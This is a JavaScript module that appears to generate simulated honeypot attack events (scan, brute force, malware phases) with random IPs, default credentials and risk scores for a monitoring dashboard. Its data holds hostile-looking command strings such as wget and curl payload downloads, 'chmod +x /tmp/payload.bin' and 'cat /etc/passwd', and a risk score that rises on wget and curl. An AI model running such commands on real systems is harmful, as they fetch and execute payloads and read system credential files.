const { randomUUID } = require("crypto");
const { analyzeEvent } = require("./analyzer");

const countries = [
  "United States",
  "Russia",
  "China",
  "Germany",
  "India",
  "Brazil",
  "Netherlands",
  "United Kingdom",
  "Singapore",
  "Japan",
  "Canada",
  "France",
];

const citiesByCountry = {
  "United States": ["New York", "Chicago", "Dallas"],
  Russia: ["Moscow", "Saint Petersburg", "Novosibirsk"],
  China: ["Beijing", "Shanghai", "Shenzhen"],
  Germany: ["Berlin", "Frankfurt", "Munich"],
  India: ["Mumbai", "Delhi", "Bengaluru"],
  Brazil: ["Sao Paulo", "Rio de Janeiro", "Brasilia"],
  Netherlands: ["Amsterdam", "Rotterdam", "Utrecht"],
  "United Kingdom": ["London", "Manchester", "Bristol"],
  Singapore: ["Singapore"],
  Japan: ["Tokyo", "Osaka", "Yokohama"],
  Canada: ["Toronto", "Vancouver", "Montreal"],
  France: ["Paris", "Lyon", "Marseille"],
};

const usernames = ["root", "admin", "user", "test"];
const passwords = ["123456", "password", "admin123", "root"];

const attackTypes = ["Brute Force", "Malware", "Scan"];

const commandsByAttackType = {
  "Brute Force": [
    "login attempt for root",
    "login attempt for admin",
    "ssh root@target",
    "ls",
    "cd /home",
  ],
  Malware: [
    "wget http://malware.sh",
    "curl -O http://payload.bin",
    "chmod +x /tmp/payload.bin",
    "sudo su",
  ],
  Scan: [
    "nmap -sV 10.0.0.0/24",
    "nc -zv 10.0.0.5 22",
    "for p in 22 80 443; do echo $p; done",
    "ls",
  ],
};

const ports = [22, 23, 80, 443, 3389, 8080];

function randomInt(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

function pickOne(items) {
  return items[randomInt(0, items.length - 1)];
}

function randomIPv4() {
  return `${randomInt(1, 223)}.${randomInt(0, 255)}.${randomInt(0, 255)}.${randomInt(1, 254)}`;
}

function computeRiskScore(attackType, command) {
  let score = randomInt(40, 70);

  if (attackType === "Malware") {
    score += 20;
  }

  if (command.includes("wget") || command.includes("curl")) {
    score += 15;
  }

  return Math.min(score, 100);
}

// Session state for behavioral patterns
let sessionState = {
  currentIP: randomIPv4(),
  currentCountry: pickOne(countries),
  sessionID: randomUUID(),
  eventsInSession: 0,
  sessionMaxEvents: randomInt(5, 15),
  sessionPhase: 0, // 0: scan, 1: brute force, 2: login success, 3: command, 4: malware
};

function nextSessionPhase() {
  sessionState.sessionPhase = (sessionState.sessionPhase + 1) % 5;
}

function generateCommandForPhase(phase) {
  const phases = {
    0: () => "nmap -sV target.local", // Scan
    1: () => pickOne(commandsByAttackType["Brute Force"]), // Brute Force
    2: () => "cd /home", // Post-login
    3: () => pickOne(["ls -la", "pwd", "whoami", "cat /etc/passwd"]), // Command
    4: () => pickOne(commandsByAttackType["Malware"]), // Malware
  };
  return (phases[phase] || (() => "ls"))();
}

function generateAttackTypeForPhase(phase) {
  const phases = {
    0: "Scan",
    1: "Brute Force",
    2: "Brute Force",
    3: "Scan",
    4: "Malware",
  };
  return phases[phase] || "Suspicious Activity";
}

function createSessionEvent() {
  // Generate event within current session
  const country = sessionState.currentCountry;
  const cityOptions = citiesByCountry[country] || [];
  const attackType = generateAttackTypeForPhase(sessionState.sessionPhase);
  const command = generateCommandForPhase(sessionState.sessionPhase);

  const event = {
    id: randomUUID(),
    timestamp: new Date().toISOString(),
    ip: sessionState.currentIP,
    country,
    city: cityOptions.length > 0 ? pickOne(cityOptions) : undefined,
    attack_type: attackType,
    username: pickOne(usernames),
    password: pickOne(passwords),
    command,
    port: 22,
    risk_score: computeRiskScore(attackType, command),
    session_id: sessionState.sessionID,
  };

  sessionState.eventsInSession += 1;
  nextSessionPhase();

  // Check if session should end
  if (sessionState.eventsInSession >= sessionState.sessionMaxEvents) {
    sessionState.currentIP = randomIPv4();
    sessionState.currentCountry = pickOne(countries);
    sessionState.sessionID = randomUUID();
    sessionState.eventsInSession = 0;
    sessionState.sessionMaxEvents = randomInt(5, 15);
    sessionState.sessionPhase = 0;
  }

  return event;
}

function createEvent() {
  return createSessionEvent();
}

function startEventGenerator(eventsArray, onEvent, profileUpdater) {
  function scheduleNext() {
    const event = createEvent();
    const recentEvents = eventsArray.slice(-49);
    const enrichedEvent = {
      ...event,
      analysis: analyzeEvent(event, [...recentEvents, event]),
    };
    eventsArray.push(enrichedEvent);

    // Update profile if callback provided
    if (typeof profileUpdater === "function") {
      const profile = profileUpdater(enrichedEvent);
      enrichedEvent.profile_id = profile.profile_id;
      enrichedEvent.profile_summary = {
        dominant_attack_type: profile.dominant_attack_type,
        activity_pattern: profile.activity_pattern,
        threat_level: profile.threat_level,
      };
    }

    if (typeof onEvent === "function") {
      onEvent(enrichedEvent);
    }

    if (eventsArray.length > 500) {
      eventsArray.splice(0, eventsArray.length - 500);
    }

    setTimeout(scheduleNext, randomInt(1000, 2000));
  }

  scheduleNext();
}

module.exports = { startEventGenerator };
